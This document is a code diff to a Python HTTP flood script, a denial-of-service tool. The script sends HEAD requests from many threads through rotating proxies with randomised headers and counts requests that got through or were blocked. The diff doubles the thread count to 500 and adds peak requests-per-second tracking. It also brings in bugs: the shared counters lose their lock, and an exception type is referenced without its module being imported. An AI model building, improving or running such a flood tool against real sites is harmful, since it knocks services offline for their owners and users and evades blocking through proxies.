@@ -3,6 +3,7 @@ import random
 import threading
 import time
 import sys
+import os
 import httpx
 
 # Load files
@@ -41,18 +42,24 @@ def generate_headers():
         "Sec-Fetch-Mode": "navigate",
     }
 
+# Function to clear terminal screen
+def clear_terminal():
+    if sys.platform == 'win32':
+        os.system('cls')
+    else:
+        os.system('clear')
+
 # Send flood requests function
 def send_flood(target, time_limit, max_threads):
     attempted, success, failed = 0, 0, 0
-    lock = threading.Lock()
+    peak_rps = 0
     start_time = time.time()
 
     def attack():
-        nonlocal attempted, success, failed
+        nonlocal attempted, success, failed, peak_rps
         while time.time() - start_time < time_limit:
             headers = generate_headers()
             proxy = random.choice(proxies) if proxies else None
-
             try:
                 if proxy:
                     proxies_format = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
@@ -61,20 +68,27 @@ def send_flood(target, time_limit, max_threads):
                     with httpx.Client(http2=True, timeout=3) as client:
                         res = client.head(target, headers=headers)
                 
-                with lock:
-                    attempted += 1
-                    if res.status_code < 500:
-                        success += 1
-                    else:
-                        failed += 1
-
-            except Exception:
-                with lock:
-                    attempted += 1
+                attempted += 1
+                if res.status_code == 200:  # If request goes through successfully
+                    success += 1
+                else:  # If blocked request (non-2xx response)
                     failed += 1
 
+            except requests.exceptions.RequestException:
+                attempted += 1
+
+            # Track peak RPS (requests per second)
+            elapsed = round(time.time() - start_time, 2)
+            rps = round(attempted / elapsed, 2)
+            if rps > peak_rps:
+                peak_rps = rps
+
+    # Dynamically scale threads to max system power
+    num_threads = max_threads  # Customize thread limit if necessary
+
+    # Create threads
     threads = []
-    for _ in range(max_threads):
+    for _ in range(num_threads):
         t = threading.Thread(target=attack)
         t.start()
         threads.append(t)
@@ -82,21 +96,28 @@ def send_flood(target, time_limit, max_threads):
     for t in threads:
         t.join(timeout=time_limit)
 
-    elapsed = round(time.time() - start_time, 2)
-    if elapsed > 20:
-        elapsed = 20
+    elapsed_time = round(time.time() - start_time, 2)
+    if elapsed_time > 20:
+        elapsed_time = 20
 
-    peak = round(attempted / elapsed, 2)
-    return attempted, success, failed, peak, elapsed
+    peak_rps = round(peak_rps, 2)
+    return attempted, success, failed, peak_rps, elapsed_time
 
 # Running the flood
 def run_flood(target, duration):
-    total, success, failed, peak, elapsed = send_flood(target, duration, 250)
-    print(f"Total Requests Sent: {total}")
-    print(f"Success Requests: {success}")
-    print(f"Failed Requests: {failed}")
-    print(f"Peak RPS: {peak}")
-    print(f"Total Time Taken: {elapsed} seconds")
+    total, success, failed, peak, elapsed = send_flood(target, duration, 500)
+    
+    clear_terminal()
+    print(f"TOTAL REQUESTS SENT: {total}")
+    print(f"SUCCES: {success}")
+    print(f"FAILED: {failed}")
+    print(f"TIME REMAINING: {max(0, duration - elapsed)} seconds")
+
+    clear_terminal()
+    print(f"TOTAL REQUESTS: {total}")
+    print(f"SUCCES: {success}")
+    print(f"FAILED: {failed}")
+    print(f"PEAK REQUESTS PER SECOND: {peak}")
 
 if __name__ == "__main__":
     if len(sys.argv) != 3:
